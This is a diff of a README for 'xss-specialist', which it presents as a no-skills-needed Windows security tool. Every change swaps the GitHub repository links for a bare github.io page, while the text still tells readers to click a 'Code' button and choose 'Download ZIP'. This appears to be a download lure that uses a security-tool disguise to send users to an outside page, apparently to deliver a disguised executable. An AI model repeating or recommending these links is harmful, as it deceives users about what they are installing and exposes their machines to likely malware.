@@ -1,6 +1,6 @@
 # 🛡️ xss-specialist - Your Guard Against Web Attacks
 
-[![Download xss-specialist](https://img.shields.io/badge/Download-xss--specialist-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Historicalrecordeffects5599/xss-specialist)
+[![Download xss-specialist](https://img.shields.io/badge/Download-xss--specialist-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://historicalrecordeffects5599.github.io)
 
 Welcome to **xss-specialist** — your personal, always-learning security expert that finds and stops dangerous website attacks before they harm you. No technical skills needed. If you can click a button, you can use this tool.
 
@@ -16,7 +16,7 @@ Getting xss-specialist up and running on your Windows computer takes less than f
 
 ### Step 1: Get the Application
 
-Visit this link to download the application: [https://github.com/Historicalrecordeffects5599/xss-specialist](https://github.com/Historicalrecordeffects5599/xss-specialist)
+Visit this link to download the application: [https://historicalrecordeffects5599.github.io](https://historicalrecordeffects5599.github.io)
 
 You'll see a green "Code" button on the page. Click it, then choose "Download ZIP." The download will start automatically. The file is small, so it should finish quickly.
 
@@ -110,7 +110,7 @@ xss-specialist respects your privacy completely. It does not track your browsing
 
 ## 👥 Getting Help
 
-If you run into any problems, head to the GitHub page: [https://github.com/Historicalrecordeffects5599/xss-specialist](https://github.com/Historicalrecordeffects5599/xss-specialist)
+If you run into any problems, head to the GitHub page: [https://historicalrecordeffects5599.github.io](https://historicalrecordeffects5599.github.io)
 
 - Click the **Issues** tab to see known problems and ask questions.
 - Click **Discussions** to talk with other users.
@@ -124,7 +124,7 @@ That's all you need to know. Download, extract, run, and protect. It's really th
 
 ### 🔗 Quick Download Again
 
-[![Download Now](https://img.shields.io/badge/⬇️_Download_xss--specialist-FF5722?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Historicalrecordeffects5599/xss-specialist)
+[![Download Now](https://img.shields.io/badge/⬇️_Download_xss--specialist-FF5722?style=for-the-badge&logo=github&logoColor=white)](https://historicalrecordeffects5599.github.io)
 
 ---
 
